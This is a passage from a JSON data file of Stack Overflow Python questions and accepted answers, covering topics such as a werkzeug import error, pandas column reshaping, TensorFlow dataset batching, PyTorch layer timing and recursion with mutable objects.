    "AcceptedAnswer": "Since the goal is to simply convert the paths to indices according to their respective positions against other paths of the same prefix, there is no need to build a tree at all. Instead, iterate over the paths in alphabetical order while using a dict of sets to keep track of the prefixes at each level of paths, and join the lengths of sets at each level for output:\ndef indices(paths):\n    output = {}\n    names = {}\n    for index, path in sorted(enumerate(paths), key=lambda t: t[1]):\n        counts = []\n        prefixes = tuple(path.split('/'))\n        for level, name in enumerate(prefixes):\n            prefix = prefixes[:level]\n            names.setdefault(prefix, set()).add(name)\n            counts.append(len(names[prefix]))\n        output[index] = '.'.join(map(str, counts))\n    return list(map(output.get, range(len(output))))\n\nso that:\nprint(indices(['a', 'a/b', 'a/b/a', 'a/c', 'a/c/a', 'b']))\nprint(indices(['a', 'c', 'b', 'a/b']))\nprint(indices(['a/b/c/d', 'a/b/d', 'a/b/c']))\nprint(indices(['abc/d', 'bcc/d']))\nprint(indices(['apple/cat','apple/dog', 'banana/dog']))\n\noutputs:\n['1', '1.1', '1.1.1', '1.2', '1.2.1', '2']\n['1', '3', '2', '1.1']\n['1.1.1.1', '1.1.2', '1.1.1']\n['1.1', '2.1']\n['1.1', '1.2', '2.1']\n\nDemo: https://replit.com/@blhsing/StainedMassivePi\n"
}
{
    "Id": 73105877,
    "PostTypeId": 1,
    "Title": "ImportError: cannot import name 'parse_rule' from 'werkzeug.routing'",
    "Body": "I got the following message after running my Flask project on another system.\nThe application ran all the time without problems:\nError: While importing 'app', an ImportError was raised:\n\nTraceback (most recent call last):\n  File \"c:\\users\\User\\appdata\\local\\programs\\python\\python39\\lib\\site-packages\\flask\\cli.py\", line 214, in locate_app\n    __import__(module_name)\n  File \"C:\\Users\\User\\Desktop\\Projekt\\app\\__init__.py\", line 3, in \n    from flask_restx import Namespace, Api\n  File \"c:\\users\\User\\appdata\\local\\programs\\python\\python39\\lib\\site-packages\\flask_restx\\__init__.py\", line 5, in \n  File \"c:\\users\\User\\appdata\\local\\programs\\python\\python39\\lib\\site-packages\\flask_restx\\api.py\", line 50, in \n    from .swagger import Swagger\n  File \"c:\\users\\User\\appdata\\local\\programs\\python\\python39\\lib\\site-packages\\flask_restx\\swagger.py\", line 18, in \n    from werkzeug.routing import parse_rule\nImportError: cannot import name 'parse_rule' from 'werkzeug.routing' (c:\\users\\User\\appdata\\local\\programs\\python\\python39\\lib\\site-packages\\werkzeug\\routing\\__i\nnit__.py)\n\nMy requirements.txt\nFlask~=2.1.2\npsycopg2-binary==2.9.3\nFlask-SQLAlchemy==2.5.1\nflask-restx==0.5.1\nqrcode~=7.3.1\nPyPDF2==2.6.0\nreportlab~=3.6.10\nWTForms~=3.0.1\nflask-bootstrap==3.3.7.1\nflask-wtf==1.0.1\n\n",
    "AcceptedAnswerId": 73105878,
    "AcceptedAnswer": "The workaround I use for now is to pin werkzeug to 2.1.2 in requirements.txt. This should only be done until the other libraries are compatible with the latest version of Werkzeug, at which point the pin should be updated.\nwerkzeug==2.1.2\n\n"
}
{
    "Id": 71915309,
    "PostTypeId": 1,
    "Title": "Token used too early error thrown by firebase_admin auth's verify_id_token method",
    "Body": "Whenever I run\nfrom firebase_admin import auth\nauth.verify_id_token(firebase_auth_token)\n\nIt throws the following error:\nToken used too early, 1650302066 < 1650302067. Check that your computer's clock is set correctly.\n\nI'm aware that the underlying google auth APIs do check the time of the token, however as outlined  here there should be a 10 second clock skew. Apparently, my server time is off by 1 second, however running this still fails even though this is well below the allowed 10 second skew. Is there a way to fix this?\n",
    "AcceptedAnswerId": 72977610,
    "AcceptedAnswer": "This is how the firebase_admin.verify_id_token verifies the token:\nverified_claims = google.oauth2.id_token.verify_token(\n                    token,\n                    request=request,\n                    audience=self.project_id,\n                    certs_url=self.cert_url)\n\nand this is the definition of google.oauth2.id_token.verify_token(...)\ndef verify_token(\n    id_token,\n    request,\n    audience=None,\n    certs_url=_GOOGLE_OAUTH2_CERTS_URL,\n    clock_skew_in_seconds=0,\n):\n\nAs you can see, the function verify_token allows to specify a \"clock_skew_in_seconds\" but the firebase_admin function is not passing it along, thus the the default of 0 is used and since your server clock is off by 1 second, the check in verify_token fails.\nI would consider this a bug in firebase_admin.verify_id_token and maybe you can open an issue against the firebase admin SDK, but other than that you can only make sure, your clock is either exact or shows a time EARLIER than the actual time\nEdit:\nI actually opened an issue on GitHub for firebase/firebase-admin-Python and created an according pull request since I looked at all the source files already anyway...\nIf and when the pull request is merged, the server's clock is allowed to be off by up to a minute.\n"
}
{
    "Id": 73134521,
    "PostTypeId": 1,
    "Title": "How to train on a tensorflow_datasets dataset",
    "Body": "I'm playing around with tensorflow to become a bit more familiar with the overall workflow. To do this I thought I should start with creating a simple classifier for the well known Iris dataset.\nI load the dataset using:\nds = tfds.load('iris', split='train', shuffle_files=True, as_supervised=True)\n\nI use the following classifier:\nmodel = keras.Sequential([\n    keras.layers.Dense(10,activation=\"relu\"),\n    keras.layers.Dense(10,activation=\"relu\"),\n    keras.layers.Dense(3, activation=\"softmax\")\n])\n\nmodel.compile(\n    optimizer=tf.keras.optimizers.Adam(0.001),\n    loss=tf.keras.losses.SparseCategoricalCrossentropy(),\n    metrics=[tf.keras.metrics.SparseCategoricalAccuracy()],\n)\n\nI then try to fit the model using:\nmodel.fit(ds,batch_size=50, epochs=100)\n\nThis gives the following error:\nInput 0 of layer \"dense\" is incompatible with the layer: expected min_ndim=2, found ndim=1. Full shape received: (4,)\n\n    Call arguments received by layer \"sequential\" (type Sequential):\n      \u2022 inputs=tf.Tensor(shape=(4,), dtype=float32)\n      \u2022 training=True\n      \u2022 mask=None\n\nI also tried defining the model using the functional API(as this was my orignal goal to learn)\ninputs = keras.Input(shape=(4,), name='features')\n\nfirst_hidden = keras.layers.Dense(10, activation='relu')(inputs)\nsecond_hidden = keras.layers.Dense(10, activation=\"relu\")(first_hidden)\n\noutputs = keras.layers.Dense(3, activation='softmax')(second_hidden)\n\nmodel = keras.Model(inputs=inputs, outputs=outputs, name=\"test_iris_classification\")\n\nI now get the same error as before but this time with a warning:\nWARNING:tensorflow:Model was constructed with shape (None, 4) for input KerasTensor(type_spec=TensorSpec(shape=(None, 4), dtype=tf.float32, name='features'), name='features', description=\"created by layer 'features'\"), but it was called on an input with incompatible shape (4,).\n\nI suspect this is something quite fundamental that haven't understood but I have not been able to figure it out, despite several hours of googling.\nPS:\nI also tried to download the whole dataset from the UCI Machine Learning Repository as a CSV file.\nI read it in like this:\nds = pd.read_csv(\"iris.data\", header=None)\nlabels = []\nfor name in ds[4]:\n    if name == \"Iris-setosa\":\n        labels.append(0)\n    elif name == \"Iris-versicolor\":\n        labels.append(1)\n    elif name == \"Iris-virginica\":\n        labels.append(2)\n    else:\n        raise ValueError(f\"Name wrong name: {name}\")\nlabels = np.array(labels)\nfeatures = np.array(ds[[0,1,2,3]])\n\nAnd fit it like this:\nmodel.fit(features, labels,batch_size=50, epochs=100)\n\nAnd I'm able to fit the model to this dataset without any problems for both the sequential and the functional API. Which makes me suspect my misunderstanding has something to do with how the tensorflow_datasets works.\n",
    "AcceptedAnswerId": 73134765,
    "AcceptedAnswer": "Set the batch size when loading your data:\nimport tensorflow_datasets as tfds\nimport tensorflow as tf\n\nds = tfds.load('iris', split='train', shuffle_files=True, as_supervised=True, batch_size=10)\nmodel = tf.keras.Sequential([\n    tf.keras.layers.Dense(10,activation=\"relu\"),\n    tf.keras.layers.Dense(10,activation=\"relu\"),\n    tf.keras.layers.Dense(3, activation=\"softmax\")\n])\n\nmodel.compile(\n    optimizer=tf.keras.optimizers.Adam(0.001),\n    loss=tf.keras.losses.SparseCategoricalCrossentropy(),\n    metrics=[tf.keras.metrics.SparseCategoricalAccuracy()],\n)\nmodel.fit(ds, epochs=100)\n\nAlso regarding model.fit, the docs state:\n\nInteger or None. Number of samples per gradient update. If\nunspecified, batch_size will default to 32. Do not specify the\nbatch_size if your data is in the form of datasets, generators, or\nkeras.utils.Sequence instances (since they generate batches).\n\n"
}
{
    "Id": 72984800,
    "PostTypeId": 1,
    "Title": "Why does unpacking non-identifier strings work on a function call?",
    "Body": "I've noticed, to my surprise, that in a function call, I could unpack a dict with strings that weren't even valid python identifiers.\nIt's surprising to me since argument names must be identifiers, so allowing a function call to unpack a **kwargs that has non-identifiers, with no run time error, doesn't seem healthy (since it could bury problems deeper that where they actually occur).\nUnless there's an actual use to being able to do this, in which case my question becomes \"what would that use be?\".\nExample code\nConsider this function:\ndef foo(**kwargs):\n    first_key, first_val = next(iter(kwargs.items()))\n    print(f\"{first_key=}, {first_val=}\")\n    return kwargs\n\nThis shows that, within a function call, you can't unpack a dict that has has integer keys, which is EXPECTED.\n>>> t = foo(**{1: 2, 3: 4})\nTypeError                                 Traceback (most recent call last)\n...\nTypeError: foo() keywords must be strings\n\nWhat is really not expected, and surprising, is that you can, on the other hand, unpack a dict with string keys, even if these are not valid python identifiers:\n>>> t = foo(**{'not an identifier': 1, '12': 12, ',(*&$)': 100})\nfirst_key='not an identifier', first_val=1\n>>> t\n{'not an identifier': 1, '12': 12, ',(*&$)': 100}\n\n",
    "AcceptedAnswerId": 72985667,
    "AcceptedAnswer": "Looks like this is more of a kwargs issue than an unpacking issue. For example, one wouldn't run into the same issue with foo:\ndef foo(a, b):\n    print(a + b)\n\nfoo(**{\"a\": 3, \"b\": 2})\n# 5\n\nfoo(**{\"a\": 3, \"b\": 2, \"c\": 4})\n# TypeError: foo() got an unexpected keyword argument 'c'\n\nfoo(**{\"a\": 3, \"b\": 2, \"not valid\": 4})\n# TypeError: foo() got an unexpected keyword argument 'not valid'\n\nBut when kwargs is used, that flexibility comes with a price. It looks like the function first attempts to pop out and map all the named arguments and then passes the remaining items in a dict called kwargs. Since all keywords are strings (but all strings are not valid keywords), the first check is easy - keywords must be strings. Beyond that, it's up to the author to figure out what to do with remaining items in kwargs.\ndef bar(a, **kwargs):\n    print(locals())\n    \nbar(a=2)\n# {'a': 2, 'kwargs': {}}\n\nbar(**{\"a\": 3, \"b\": 2})\n# {'a': 3, 'kwargs': {'b': 2}}\n\nbar(**{\"a\": 3, \"b\": 2, \"c\": 4})\n# {'a': 3, 'kwargs': {'b': 2, 'c': 4}}\n\nbar(**{1: 3, 3: 4})\n# TypeError: keywords must be strings\n\nHaving said all that, there definitely is inconsistency but not a flaw. Some related discussions:\n\nSupporting (or not) invalid identifiers in **kwargs \nfeature: **kwargs allowing improperly named variables\n\n"
}
{
    "Id": 73635605,
    "PostTypeId": 1,
    "Title": "Combine multiple columns into one category column using the column names as value label",
    "Body": "I have this data\n   ID      A      B      C\n0   0   True  False  False\n1   1  False   True  False\n2   2  False  False   True\n\nAnd want to transform it into\n   ID group\n0   0     A\n1   1     B\n2   2     C\n\n\nI want to use the column names as value labels for the category column.\nThere is a maximum of only one True value per row.\n\nThis is the MWE\n#!/usr/bin/env python3\nimport pandas as pd\n\ndf = pd.DataFrame({\n    'ID': range(3),\n    'A': [True, False, False],\n    'B': [False, True, False],\n    'C': [False, False, True]\n})\n\nresult = pd.DataFrame({\n    'ID': range(3),\n    'group': ['A', 'B', 'C']\n})\nresult.group = result.group.astype('category')\n\nprint(df)\nprint(result)\n\nI could do df.apply(lambda row: ...magic.., axis=1). But isn't there a more elegant way with pandas' own tools?\n",
    "AcceptedAnswerId": 73635685,
    "AcceptedAnswer": "You can use melt then a lookup based on the column where the values are true to get the results you are expecting\ndf = df.melt(id_vars = 'ID', var_name = 'group')\ndf.loc[df['value'] == True][['ID', 'group']]\n\n"
}
{
    "Id": 73629154,
    "PostTypeId": 1,
    "Title": "Command Line stable diffusion runs out of GPU memory but GUI version doesn't",
    "Body": "I installed the GUI version of Stable Diffusion here. With it I was able to make 512 by 512 pixel images using my GeForce RTX 3070 GPU with 8 GB of memory:\n\nHowever when I try to do the same thing with the command line interface, I run out of memory:\nInput:\n>> C:\\SD\\stable-diffusion-main>python scripts/txt2img.py --prompt \"a close-up portrait of a cat by pablo picasso, vivid, abstract art, colorful, vibrant\" --plms --n_iter 3 --n_samples 1 --H 512 --W 512\nError:\nRuntimeError: CUDA out of memory. Tried to allocate 1024.00 MiB (GPU 0; 8.00 GiB total capacity; 6.13 GiB already allocated; 0 bytes free; 6.73 GiB reserved in total by PyTorch) If reserved memory is >> allocated memory try setting max_split_size_mb to avoid fragmentation.  See documentation for Memory Management and PYTORCH_CUDA_ALLOC_CONF\nIf I reduce the size of the image to 256 X 256, it gives a result, but obviously much lower quality.\nSo part 1 of my question is why do I run out of memory at 6.13 GiB when I have 8 GiB on the card, and part 2 is what does the GUI do differently to allow 512 by 512 output? Is there a setting I can change to reduce the load on the GPU?\nThanks a lot,\nAlex\n",
    "AcceptedAnswerId": 73642630,
    "AcceptedAnswer": "This might not be the only answer, but I solved it by using the optimized version here. If you already have the standard version installed, just copy the \"OptimizedSD\" folder into your existing folders, and then run the optimized txt2img script instead of the original:\n>> python optimizedSD/optimized_txt2img.py --prompt \"a close-up portrait of a cat by pablo picasso, vivid, abstract art, colorful, vibrant\" --H 512 --W 512 --seed 27 --n_iter 2 --n_samples 10 --ddim_steps 50\nIt's quite slow on my computer, but produces 512 X 512 images!\nThanks,\nAlex\n"
}
{
    "Id": 74290259,
    "PostTypeId": 1,
    "Title": "count the number of three way conversations in a group chat dataset using pandas",
    "Body": "I wanted to count the number of three way conversations that have occured in a dataset.\nA chat group_x can consist of multiple members.\nWhat is a three way conversation?\n\n1st way - red_x sends a message in the group_x.\n2nd way - green_x replies in the same group_x.\n3rd way - red_x sends a reply in the same group_x.\n\nThis can be called a three way conversation.\nThe sequence has to be exactly red_#, green_#, red_#.\nWhat is touchpoint?\n\nTouchpoint 1 - red_x's first message.\nTouchpoint 2 - green_x's first message.\nTouchpoint 3 - red_x's second message.\n\nCode to easily generate a sample dataset I'm working with.\nimport pandas as pd\nfrom pandas import Timestamp\n\nt1_df = pd.DataFrame({'from_red': [True, False, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, False, True], \n              'sent_time': [Timestamp('2021-05-01 06:26:00'), Timestamp('2021-05-04 10:35:00'), Timestamp('2021-05-07 12:16:00'), Timestamp('2021-05-07 12:16:00'), Timestamp('2021-05-09 13:39:00'), Timestamp('2021-05-11 10:02:00'), Timestamp('2021-05-12 13:10:00'), Timestamp('2021-05-12 13:10:00'), Timestamp('2021-05-13 09:46:00'), Timestamp('2021-05-13 22:30:00'), Timestamp('2021-05-14 14:14:00'), Timestamp('2021-05-14 17:08:00'), Timestamp('2021-06-01 09:22:00'), Timestamp('2021-06-01 21:26:00'), Timestamp('2021-06-03 20:19:00'), Timestamp('2021-06-03 20:19:00'), Timestamp('2021-06-09 07:24:00'), Timestamp('2021-05-01 06:44:00'), Timestamp('2021-05-01 08:01:00'), Timestamp('2021-05-01 08:09:00')], \n              'w_uid': ['w_000001', 'w_112681', 'w_002516', 'w_002514', 'w_004073', 'w_005349', 'w_006803', 'w_006804', 'w_008454', 'w_009373', 'w_010063', 'w_010957', 'w_066840', 'w_071471', 'w_081446', 'w_081445', 'w_106472', 'w_000002', 'w_111906', 'w_000003'], \n              'user_id': ['red_00001', 'green_0263', 'red_01071', 'red_01071', 'red_01552', 'red_01552', 'red_02282', 'red_02282', 'red_02600', 'red_02854', 'red_02854', 'red_02600', 'red_00001', 'red_09935', 'red_10592', 'red_10592', 'red_12292', 'red_00002', 'green_0001', 'red_00003'], \n              'group_id': [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1], \n              'touchpoint': [1, 2, 1, 3, 1, 3, 1, 3, 1, 1, 3, 3, 3, 1, 1, 3, 1, 1, 2, 1]}, \n                     columns = ['from_red', 'sent_time', 'w_uid', 'user_id', 'group_id', 'touchpoint'])\n\nt1_df['sent_time'] = pd.to_datetime(t1_df['sent_time'], format = \"%d-%m-%Y\")\nt1_df\n\nThe dataset looks like this:\n\n\n\n\nfrom_red\nsent_time\nw_uid\nuser_id\ngroup_id\ntouchpoint\n\n\n\n\nTrue\n2021-05-01 06:26:00\nw_000001\nred_00001\n0\n1\n\n\nFalse\n2021-05-04 10:35:00\nw_112681\ngreen_0263\n0\n2\n\n\nTrue\n2021-05-07 12:16:00\nw_002516\nred_01071\n0\n1\n\n\nTrue\n2021-05-07 12:16:00\nw_002514\nred_01071\n0\n3\n\n\nTrue\n2021-05-09 13:39:00\nw_004073\nred_01552\n0\n1\n\n\nTrue\n2021-05-11 10:02:00\nw_005349\nred_01552\n0\n3\n\n\nTrue\n2021-05-12 13:10:00\nw_006803\nred_02282\n0\n1\n\n\nTrue\n2021-05-12 13:10:00\nw_006804\nred_02282\n0\n3\n\n\nTrue\n2021-05-13 09:46:00\nw_008454\nred_02600\n0\n1\n\n\nTrue\n2021-05-13 22:30:00\nw_009373\nred_02854\n0\n1\n\n\nTrue\n2021-05-14 14:14:00\nw_010063\nred_02854\n0\n3\n\n\nTrue\n2021-05-14 17:08:00\nw_010957\nred_02600\n0\n3\n\n\nTrue\n2021-06-01 09:22:00\nw_066840\nred_00001\n0\n3\n\n\nTrue\n2021-06-01 21:26:00\nw_071471\nred_09935\n0\n1\n\n\nTrue\n2021-06-03 20:19:00\nw_081446\nred_10592\n0\n1\n\n\nTrue\n2021-06-03 20:19:00\nw_081445\nred_10592\n0\n3\n\n\nTrue\n2021-06-09 07:24:00\nw_106472\nred_12292\n0\n1\n\n\nTrue\n2021-05-01 06:44:00\nw_000002\nred_00002\n1\n1\n\n\nFalse\n2021-05-01 08:01:00\nw_111906\ngreen_0001\n1\n2\n\n\nTrue\n2021-05-01 08:09:00\nw_000003\nred_00003\n1\n1\n\n\n\n\nHere is what I have tried, but the query is taking too long. Is there a faster way to achieve the same?\ntest_df = pd.DataFrame()\nfor i in range(len(t1_df['sent_time'])-1):\n    if t1_df.query(f\"group_id == {i}\")['from_red'].nunique() == 2:\n        y = t1_df.query(f\"group_id == {i} & touchpoint == 2\").loc[:, ['sent_time']].values[0][0]\n        x = t1_df.query(f\"group_id == {i} & sent_time > @y & (touchpoint == 3)\").sort_values('sent_time')\n        test_df = pd.concat([test_df, x])\n        test_df.merge(x, how = \"outer\")\n        \n    else:\n        pass\n\ntest_df\n\n",
    "AcceptedAnswerId": 74401453,
    "AcceptedAnswer": "For me it's not clear how you define the \"three way conversation\". Within on group, if you have the input messages what option(s) do you consider as \"three way conversation\"? There are several options:\nInput  : red_0, red_2, green_0, red_1, red_0, red_2, red_1\nOption1:        red_2, green_0, red_1\nOption2: red_0,        green_0,        red_0\n   +   :        red_2, green_0,               red_2\n\nand many more. Your code example returns the second msg of a user when sent after green:\nOptionX:               green_0,         red_0\n   +   :               green_0,               red_2\n   +   :               green_0,                      red_1\n\nwithout keeping track if some red user sent a msg before green. Another question is, what happens if green is sending multiple times within one group.\nInput  : red_0, red_2, green_0, green_0, red_1, red_0, green_1, red_1\n\nBased on your description \"The sequence has to be exactly red_#, green_#, red_#.\" I guess, Option1 is what you are looking for and maybe that it's even independent from the color: color0_#, color1_#, color0_#. Correct me if I'm wrong ;).\nPrepare the DataFrame\nTo get the operation more generic, I would first prepare the DataFrame, e.g. extract the color of the user and get a integer represenation for the color\n# extract the user color and id\nt1_df[['color', 'id']] = t1_df.pop('user_id').str.split('_', expand=True)\n# get the dtypes right, also it is not needed here\nt1_df.id = t1_df.id.astype(int)\nt1_df.color = t1_df.color.astype('category')\n# get color as intager\nt1_df['color_as_int'] =pd.factorize(t1_df.color)[0]\n\nDetect the sequence color0_#, color1_#, color0_#\n# a three way conversation is where color_as_int is [...,a,b,a,...]\n# expressed as difference it's color_as_int.diff() is [...,c,-c,...]\n# get the difference with tracking the group, therefore first sort\nt1_df.sort_values(['group_id', 'sent_time'], inplace=True)\nd_color = t1_df.groupby(['group_id']).color_as_int.diff()\nm = (d_color != 0) & (d_color == -d_color.shift(-1))  # detect [...,c,-c,...]\n# count up for each three way conversation\nm[m] = m[m].cumsum()\nm = m.astype(int)\n\n# get the labels for the dataframe [...,a,b,a,...]\nt1_df['three_way_conversation'] = m + m.shift(1, fill_value=0) + m.shift(-1, fill_value=0)\n\nwhich returns and works for any color\ncolumns = ['sent_time', 'group_id', 'color', 'id', 'touchpoint']\nprint(t1_df.loc[t1_df['three_way_conversation']>0, columns])\n\n             sent_time  group_id  color    id  touchpoint\n0  2021-05-01 06:26:00         0    red     1           1\n1  2021-05-04 10:35:00         0  green   263           2\n2  2021-05-07 12:16:00         0    red  1071           1\n17 2021-05-01 06:44:00         1    red     2           1\n18 2021-05-01 08:01:00         1  green     1           2\n19 2021-05-01 08:09:00         1    red     3           1\n\nBonus\nwith the DataFrame preparation you can easily count the msg per color or user within a group or get the first and last time of a msg from a color or user. cumcount is faster as count and pd.merg() afterwards.\nt1_df['color_msg_count'] = t1_df.groupby(['group_id', 'color']).cumcount() + 1\nt1_df['user_msg_count'] = t1_df.groupby(['group_id', 'color', 'id']).cumcount() + 1\n\nt1_df['user_sent_time_min'] = t1_df.sort_values('sent_time').groupby(['group_id', 'color', 'id']).sent_time.cummin()\nt1_df['user_sent_time_max'] = t1_df.sort_values('sent_time', ascending=False).groupby(['group_id', 'color', 'id']).sent_time.cummax()\n\n"
}
{
    "Id": 72103359,
    "PostTypeId": 1,
    "Title": "Format a Jupyter notebook on save in VSCode",
    "Body": "I use black to automatically format all of my Python code whenever I save in VSCode. I'd like the same functionality, but within a Jupyter notebook in VSCode.\nThis answer shows how to right click and format a cell or a whole notebook from the right click context menu, or a keyboard shortcut. Can I make this happen on save instead?\nIt looks like there is an issue related to this, but it is over a year old.\nAre there any good workarounds? Maybe a way to set the format notebook option to the same keybinding as save?\nUPDATE:\nIf you like me want this functionality to be added please go to the issue and upvote it, the devs said they will need a bunch of upvotes before it's considered.\n",
    "AcceptedAnswerId": 73225286,
    "AcceptedAnswer": "This is not officially supported, but there could be workarounds.\nFrom janosh's reply on GitHub:\nThere is a setting editor.codeActionsOnSave but it doesn't allow running arbitrary shell commands (for security reasons?) so you'd need to install an extension like Run On Save and get it to call black path/to/file.ipynb on save events.\nSadly even that doesn't work right now since VS Code does not yet expose lifecycle events for notebooks. The issue to upvote for that is: Improve workspace API for Notebook lifecycle to support (at least) saving events\nIf both get implemented, you should be able to add this to your settings to auto-format Jupyter notebooks:\n\"emeraldwalk.runonsave\": {\n  \"commands\": [\n    {\n      \"match\": \"\\\\.ipynb$\",\n      \"cmd\": \"black ${file}\"\n    }\n  ]\n}\n\n"
}
{
    "Id": 72224866,
    "PostTypeId": 1,
    "Title": "How to get time taken for each layer in Pytorch?",
    "Body": "I want to know the inference time of a layer in Alexnet. This code measures the inference time of the first fully connected layer of Alexnet as the batch size changes. And I have a few questions about this.\n\nIs it possible to measure the inference time accurately with the following code?\nIs there a time difference because the CPU and GPU run separately?\nIs there a module used to measure layer inference time in Pytorch?\n\nGiven the following code:\nimport torch\nimport torch.optim as optim\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom torchvision import transforms\nimport time\nfrom tqdm import tqdm\n\n\nclass AlexNet(nn.Module):\n    def __init__(self):\n        super(AlexNet, self).__init__()\n\n        self.relu = nn.ReLU(inplace=True)\n        self.maxpool2D = nn.MaxPool2d(kernel_size=3, stride=2, padding=0)\n        self.adaptive_avg_polling = nn.AdaptiveAvgPool2d((6, 6))\n        self.dropout = nn.Dropout(p=0.5)\n\n        self.conv1 = nn.Conv2d(3, 64, kernel_size=11, stride=4, padding=2)\n        self.conv2 = nn.Conv2d(64, 192, kernel_size=5, padding=2)\n        self.conv3 = nn.Conv2d(192, 384, kernel_size=3, padding=1)\n        self.conv4 = nn.Conv2d(384, 256, kernel_size=3, padding=1)\n        self.conv5 = nn.Conv2d(256, 256, kernel_size=3, padding=1)\n        self.fc1 = nn.Linear(256 * 6 * 6, 4096)\n        self.fc2 = nn.Linear(4096, 4096)\n        self.fc3 = nn.Linear(4096, 1000)\n\n    def time(self, x):\n        x = self.maxpool2D(self.relu(self.conv1(x)))\n        x = self.maxpool2D(self.relu(self.conv2(x)))\n        x =                self.relu(self.conv3(x))\n        x =                self.relu(self.conv4(x))\n        x = self.maxpool2D(self.relu(self.conv5(x)))\n        x = self.adaptive_avg_polling(x)\n\n\n        x = x.view(x.size(0), -1)\n        x = self.dropout(x)\n\n        start1 = time.time()\n        x = self.fc1(x)\n        finish1 = time.time()\n\n        x = self.dropout(self.relu(x))\n        x = self.fc2(x)\n        x = self.relu(x)\n        x = self.fc3(x)\n\n        return finish1 - start1\n\n\n\ndef layer_time():\n     use_cuda = torch.cuda.is_available()\n     print(\"use_cuda : \", use_cuda)\n\n     FloatTensor = torch.cuda.FloatTensor if use_cuda else torch.FloatTensor\n     device= torch.device(\"cuda:0\" if use_cuda else \"cpu\")\n\n     net = AlexNet().to(device)\n\n     test_iter = 10000\n     batch_size = 1\n     for i in range(10):\n         X = torch.randn(size=(batch_size, 3, 227, 227)).type(FloatTensor)\n         s = 0.0\n         for i in tqdm(range(test_iter)):\n             s += net.time(X)\n         print(s)\n         batch_size *= 2\n\n\n layer_time()\n\n\n",
    "AcceptedAnswerId": 73269143,
    "AcceptedAnswer": "I found a way to measure inference time by studying the AMP document. Using this, the GPU and CPU are synchronized and the inference time can be measured accurately.\nimport torch, time, gc\n\n# Timing utilities\nstart_time = None\n\ndef start_timer():\n    global start_time\n    gc.collect()\n    torch.cuda.empty_cache()\n    torch.cuda.reset_max_memory_allocated()\n    torch.cuda.synchronize()\n    start_time = time.time()\n\ndef end_timer():\n    torch.cuda.synchronize()\n    end_time = time.time()\n    return end_time - start_time\n\nSo my code changes as follows:\nimport torch, time, gc\nfrom tqdm import tqdm\nimport torch.nn as nn\nimport torch\n\n# Timing utilities\nstart_time = None\n\ndef start_timer():\n    global start_time\n    gc.collect()\n    torch.cuda.empty_cache()\n    torch.cuda.reset_max_memory_allocated()\n    torch.cuda.synchronize()\n    start_time = time.time()\n\ndef end_timer():\n    torch.cuda.synchronize()\n    end_time = time.time()\n    return end_time - start_time\n\n\nclass AlexNet(nn.Module):\n    def __init__(self):\n        super(AlexNet, self).__init__()\n\n        self.relu = nn.ReLU(inplace=True)\n        self.maxpool2D = nn.MaxPool2d(kernel_size=3, stride=2, padding=0)\n        self.adaptive_avg_polling = nn.AdaptiveAvgPool2d((6, 6))\n        self.dropout = nn.Dropout(p=0.5)\n\n        self.conv1 = nn.Conv2d(3, 64, kernel_size=11, stride=4, padding=2)\n        self.conv2 = nn.Conv2d(64, 192, kernel_size=5, padding=2)\n        self.conv3 = nn.Conv2d(192, 384, kernel_size=3, padding=1)\n        self.conv4 = nn.Conv2d(384, 256, kernel_size=3, padding=1)\n        self.conv5 = nn.Conv2d(256, 256, kernel_size=3, padding=1)\n        self.fc1 = nn.Linear(256 * 6 * 6, 4096)\n        self.fc2 = nn.Linear(4096, 4096)\n        self.fc3 = nn.Linear(4096, 1000)\n\n    def time(self, x):\n        x = self.maxpool2D(self.relu(self.conv1(x)))\n        x = self.maxpool2D(self.relu(self.conv2(x)))\n        x =                self.relu(self.conv3(x))\n        x =                self.relu(self.conv4(x))\n        x = self.maxpool2D(self.relu(self.conv5(x)))\n        x = self.adaptive_avg_polling(x)\n\n\n        x = x.view(x.size(0), -1)\n        x = self.dropout(x)\n\n        # Check first linear layer inference time\n        start_timer()\n        x = self.fc1(x)\n        result = end_timer()\n\n        x = self.dropout(self.relu(x))\n        x = self.fc2(x)\n        x = self.relu(x)\n        x = self.fc3(x)\n\n        return result\n\n\ndef layer_time():\n     use_cuda = torch.cuda.is_available()\n     print(\"use_cuda : \", use_cuda)\n\n     FloatTensor = torch.cuda.FloatTensor if use_cuda else torch.FloatTensor\n     device= torch.device(\"cuda:0\" if use_cuda else \"cpu\")\n\n     net = AlexNet().to(device)\n\n     test_iter = 1000\n     batch_size = 1\n     for i in range(10):\n         X = torch.randn(size=(batch_size, 3, 227, 227)).type(FloatTensor)\n         s = 0.0\n         for i in tqdm(range(test_iter)):\n             s += net.time(X)\n         print(s)\n         batch_size *= 2\n\nlayer_time()\n\n"
}
{
    "Id": 73647685,
    "PostTypeId": 1,
    "Title": "Why does a temporary variable in Python change how this Pass-By-Sharing variable behaves?",
    "Body": "first-time questioner here so do highlight my mistakes.\nI was grinding some Leetcode and came across a behavior (not related to the problem) in Python I couldn't quite figure out nor google-out. It's especially difficult because I'm not sure if my lack of understanding is in:\n\nrecursion\nthe += operator in Python or variable assignment in general\nor Python's pass-by-sharing behavior\nor just something else entirely\n\nHere's the simplified code:\nclass Holder:\n    def __init__(self, val=0):\n         self.val = val\n\nclass Solution:\n    def runThis(self):\n        holder = Holder()\n        self.diveDeeper(holder, 5)\n        return \n        \n    def diveDeeper(self, holder, n):\n        if n==0:\n            return 1\n\n        # 1) Doesn't result in mutation\n        holder.val += self.diveDeeper(holder, n-1)\n\n        # 2) Also doesn't result in mutation\n        # holder.val = holder.val + self.diveDeeper(holder, n-1)\n\n        # 3) !! Results in mutations\n        # returnVal = self.diveDeeper(holder, n-1)\n        # holder.val += returnVal\n\n        print(holder.val)\n        return 1\n\na = Solution()\na.runThis()\n\nSo yeah my main source of confusion is how (1) and (3) look semantically identical to me but results in two completely different outcomes:\n================ RESTART: Case 1 ===============\n1\n1\n1\n1\n1\n>>> \n================ RESTART: Case 3 ===============\n\n1\n2\n3\n4\n5\n>>> \n\nFrom (2), it doesn't seem related to the += operator and for brevity, I haven't included the tens of variations I've tried but none of them have given me any leads so far. Would really appreciate any pointers in the right direction (especially in case I get blindsided in job interviews lmao)\nPS: In case this is relevant, I'm using Python 3.8.2\n",
    "AcceptedAnswerId": 73648204,
